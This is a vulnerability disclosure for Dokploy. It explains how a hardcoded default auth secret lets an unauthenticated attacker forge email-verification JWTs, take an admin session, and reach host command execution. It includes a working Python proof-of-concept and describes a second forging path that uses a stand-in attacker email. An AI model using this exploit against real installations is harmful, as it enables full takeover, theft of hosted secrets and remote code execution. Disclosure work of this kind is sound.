repo.description:
## Summary

Hardcoded `BETTER_AUTH_SECRET` fallback (`"better-auth-secret-123456789"`) lets an unauthenticated attacker forge email verification JWTs, trigger auto-sign-in as admin, and execute commands on the host via the built-in SSH terminal.

## Details

`packages/server/src/constants/index.ts:88-89`:
```typescript
export const BETTER_AUTH_SECRET =
    process.env.BETTER_AUTH_SECRET || "better-auth-secret-123456789";
```

The install script never sets this env var. All default self-hosted instances share the same signing secret.

better-auth verifies email verification tokens by HS256 signature only (no DB lookup). When verification succeeds, `autoSignInAfterVerification: true` creates a database session and sets a session cookie. The `emailVerified` early-return guard does not trigger because self-hosted admin users register with `emailVerified: false` (no verification email is ever sent).

Second path: forge JWT with `requestType: "change-email-verification"` + `updateTo: "attacker@evil.com"` -- works even if `emailVerified: true`.

## PoC

```python
import jwt, time, requests

SECRET = "better-auth-secret-123456789"
TARGET = "https://dokploy.example.com"
ADMIN_EMAIL = "admin@example.com"

token = jwt.encode(
    {"email": ADMIN_EMAIL, "iat": int(time.time()), "exp": int(time.time()) + 3600},
    SECRET, algorithm="HS256"
)

s = requests.Session()
r = s.get(f"{TARGET}/api/auth/verify-email?token={token}")
print(s.cookies)  # better-auth.session_token = admin session
```

Full E2E test (Docker, default install, signup + forge + verify) available on request.

## Impact

Unauthenticated remote attacker gains full admin control of any default Dokploy installation. Admin access = RCE on host via SSH terminal, access to all hosted apps/databases/secrets, stored SSH keys, and registry credentials.
